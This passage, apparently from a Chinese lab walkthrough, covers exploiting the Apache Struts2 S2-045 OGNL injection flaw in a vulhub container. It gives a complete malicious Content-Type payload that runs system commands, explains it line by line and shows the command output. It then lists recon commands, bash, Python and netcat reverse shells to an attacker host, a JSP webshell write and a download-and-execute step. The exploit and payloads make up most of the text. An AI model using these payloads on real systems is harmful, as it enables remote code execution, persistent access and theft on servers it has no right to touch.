&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;CONTAINER&lt;/span&gt; ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;2363a15cda30&lt;/span&gt;   vulhub/struts2:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mvn-server&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min ago   Up &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min     &lt;span class=&#34;hljs-number&#34;&gt;0.0.0.0:8080&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;/tcp  s2-&lt;span class=&#34;hljs-number&#34;&gt;045&lt;/span&gt;-struts2-&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;环境验证&#34;&gt;&lt;a href=&#34;#环境验证&#34; class=&#34;headerlink&#34; title=&#34;环境验证&#34;&gt;&lt;/a&gt;环境验证&lt;/h3&gt;&lt;p&gt;访问 &lt;code&gt;http://192.168.56.102:8080/&lt;/code&gt; 应该能看到Struts2默认页面。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用实战&#34;&gt;&lt;a href=&#34;#漏洞利用实战&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用实战&#34;&gt;&lt;/a&gt;漏洞利用实战&lt;/h2&gt;&lt;h3 id=&#34;Payload构造原理&#34;&gt;&lt;a href=&#34;#Payload构造原理&#34; class=&#34;headerlink&#34; title=&#34;Payload构造原理&#34;&gt;&lt;/a&gt;Payload构造原理&lt;/h3&gt;&lt;p&gt;恶意Content-Type的核心结构：&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content&lt;/span&gt;-Type: %&amp;#123;OGNL_EXPRESSION&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;完整攻击载荷&#34;&gt;&lt;a href=&#34;#完整攻击载荷&#34; class=&#34;headerlink&#34; title=&#34;完整攻击载荷&#34;&gt;&lt;/a&gt;完整攻击载荷&lt;/h3&gt;&lt;figure class=&#34;highlight smalltalk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs smalltalk&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;GET&lt;/span&gt; / &lt;span class=&#34;hljs-type&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Host&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.102&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;User&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Agent&lt;/span&gt;: &lt;span class=&#34;hljs-type&#34;&gt;Mozilla&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;5.0&lt;/span&gt; (compatible; &lt;span class=&#34;hljs-type&#34;&gt;MSIE&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;9.0&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;NT&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6.1&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Win64&lt;/span&gt;; x64)&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Accept&lt;/span&gt;: text/html,application/xhtml+xml,application/xml;q=&lt;span class=&#34;hljs-number&#34;&gt;0.9&lt;/span&gt;,*/*;q=&lt;span class=&#34;hljs-number&#34;&gt;0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Connection&lt;/span&gt;: close&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Type&lt;/span&gt;: %&amp;#123;&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#nike&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;multipart/form-data&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;=@ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlContext&lt;/span&gt;@&lt;span class=&#34;hljs-type&#34;&gt;DEFAULT_MEMBER_ACCESS&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;):(&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;&lt;/span&gt;]).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlUtil&lt;/span&gt;@class)).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;))&lt;br&gt;    )).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.&lt;span class=&#34;hljs-type&#34;&gt;System&lt;/span&gt;@getProperty(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;os.name&amp;#x27;&lt;/span&gt;).toLowerCase().contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;win&amp;#x27;&lt;/span&gt;))).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd.exe&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/bin/bash&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;-c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;=new java.lang.&lt;span class=&#34;hljs-type&#34;&gt;ProcessBuilder&lt;/span&gt;(&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.start()).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.&lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;@getResponse().getOutputStream())).&lt;br&gt;    (@org.apache.commons.io.&lt;span class=&#34;hljs-type&#34;&gt;IOUtils&lt;/span&gt;@copy(&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;.flush())&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Length&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Payload逐行解析&#34;&gt;&lt;a href=&#34;#Payload逐行解析&#34; class=&#34;headerlink&#34; title=&#34;Payload逐行解析&#34;&gt;&lt;/a&gt;Payload逐行解析&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;表达式片段&lt;/th&gt;
&lt;th&gt;功能说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#nike=&amp;#39;multipart/form-data&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;设置伪装的Content-Type&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取默认成员访问权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#_memberAccess=#dm&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;绕过Struts2的安全限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#container=#context[...]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取ActionContext容器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedPackageNames().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;清除包名黑名单&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedClasses().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;清除类名黑名单&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmd=&amp;#39;whoami&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;定义要执行的命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#iswin=...contains(&amp;#39;win&amp;#39;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;判断操作系统类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmds=(#iswin?&amp;#123;...&amp;#125;:&amp;#123;...&amp;#125;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;根据系统类型构造命令参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#p=new ProcessBuilder(#cmds)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;创建进程构建器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#process=#p.start()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;启动进程执行命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;IOUtils@copy(...)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;将命令输出写入HTTP响应&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;攻击效果演示&#34;&gt;&lt;a href=&#34;#攻击效果演示&#34; class=&#34;headerlink&#34; title=&#34;攻击效果演示&#34;&gt;&lt;/a&gt;攻击效果演示&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;请求发送后的响应&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt; OK&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Apache-Coyote/1.1&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html;charset=UTF-8&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;9&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Wed, 24 Jul 2025 08:30:45 GMT&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;br&gt;&lt;span class=&#34;language-haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;高级利用技巧&#34;&gt;&lt;a href=&#34;#高级利用技巧&#34; class=&#34;headerlink&#34; title=&#34;高级利用技巧&#34;&gt;&lt;/a&gt;高级利用技巧&lt;/h2&gt;&lt;h3 id=&#34;1-信息收集命令&#34;&gt;&lt;a href=&#34;#1-信息收集命令&#34; class=&#34;headerlink&#34; title=&#34;1. 信息收集命令&#34;&gt;&lt;/a&gt;1. 信息收集命令&lt;/h3&gt;&lt;figure class=&#34;highlight autoit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autoit&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 系统信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;uname -a&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 当前用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 网络配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ifconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 进程列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ps aux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 文件系统&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ls -la /&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-反弹Shell&#34;&gt;&lt;a href=&#34;#2-反弹Shell&#34; class=&#34;headerlink&#34; title=&#34;2. 反弹Shell&#34;&gt;&lt;/a&gt;2. 反弹Shell&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Bash反弹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&amp;gt;&amp;amp;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Python反弹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;python -c &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;192.168.56.1\&amp;quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&amp;quot;&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# NC反弹Shell  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;nc -e /bin/sh &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-文件操作&#34;&gt;&lt;a href=&#34;#3-文件操作&#34; class=&#34;headerlink&#34; title=&#34;3. 文件操作&#34;&gt;&lt;/a&gt;3. 文件操作&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 读取敏感文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;cat /etc/passwd&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 写入WebShell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;echo &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%@ page import=\&amp;quot;java.io.*\&amp;quot; %&amp;gt;&amp;lt;% String cmd = request.getParameter(\&amp;quot;cmd\&amp;quot;); Process p = Runtime.getRuntime().exec(cmd); %&amp;gt;&amp;quot;&lt;/span&gt; &amp;gt; /tmp/shell.jsp&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 下载文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;wget http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;amp;&amp;amp; chmod +x /tmp/shell.sh &amp;amp;&amp;amp; /tmp/shell.sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

